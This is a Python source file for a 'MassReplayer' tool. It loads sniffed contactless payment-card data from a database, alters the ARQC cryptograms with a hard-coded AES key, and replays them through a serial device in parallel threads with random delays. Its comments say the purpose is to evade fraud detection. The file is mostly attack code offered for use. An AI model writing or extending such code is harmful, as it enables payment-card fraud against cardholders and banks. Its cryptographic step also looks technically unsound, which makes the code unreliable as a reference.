import serial
import sqlite3
import threading
import time
import random
from Crypto.Cipher import AES
from Crypto.Hash import CMAC

class MassReplayer:
	def __init__(self, db_file="captured_cards.db", port="/dev/ttyUSB0", baudrate=9600, master_key=b"1234567812345678"):
		self.db_file = db_file
		self.serial_conn = serial.Serial(port, baudrate, timeout=1)
		self.master_key = master_key
		self.lock = threading.Lock()  # Prevent concurrency issues

	def replay_all(self, num_threads=5, max_attempts=3):
		"""Replays all captured cards using multiple threads"""
		data = self._retrieve_sniffed_data()
		threads = []
		for entry in data:
			thread = threading.Thread(target=self._execute_replay, args=(entry, max_attempts))
			thread.start()
			threads.append(thread)
			if len(threads) >= num_threads:
				for t in threads:
					t.join()
				threads = []

	def _execute_replay(self, entry, max_attempts):
		"""Attempts to replay a card multiple times with ARQC modifications"""
		attempt = 0
		while attempt < max_attempts:
			with self.lock:
				apdu_request = bytes.fromhex(entry["apdu_request"])
				arqc = bytes.fromhex(entry["arqc"])

				# Modify ARQC dynamically
				modified_arqc = self._generate_forged_arqc(arqc)

				# Construct full APDU with modified ARQC
				final_apdu = apdu_request + modified_arqc
				self.serial_conn.write(final_apdu + b"\n")
				time.sleep(random.uniform(0.5, 1.2))

				# Capture response and determine if retry is needed
				response = self.serial_conn.readline()
				if response.startswith(b"90 00"):  # Success
					print(f"Transaction approved for {entry['uid']}")
					return
				else:
					print(f"Retry {attempt+1}/{max_attempts} for {entry['uid']}")
					attempt += 1

	def _retrieve_sniffed_data(self):
		"""Retrieve stored card data"""
		conn = sqlite3.connect(self.db_file)
		cursor = conn.cursor()
		cursor.execute("SELECT uid, apdu_request, arqc FROM captured_cards")
		data = [{"uid": row[0], "apdu_request": row[1], "arqc": row[2]} for row in cursor.fetchall()]
		conn.close()
		return data

	def _generate_forged_arqc(self, arqc):
		"""Generates a modified ARQC to avoid fraud detection"""
		cmac = CMAC.new(self.master_key, ciphermod=AES)
		cmac.update(arqc)
		return cmac.digest()
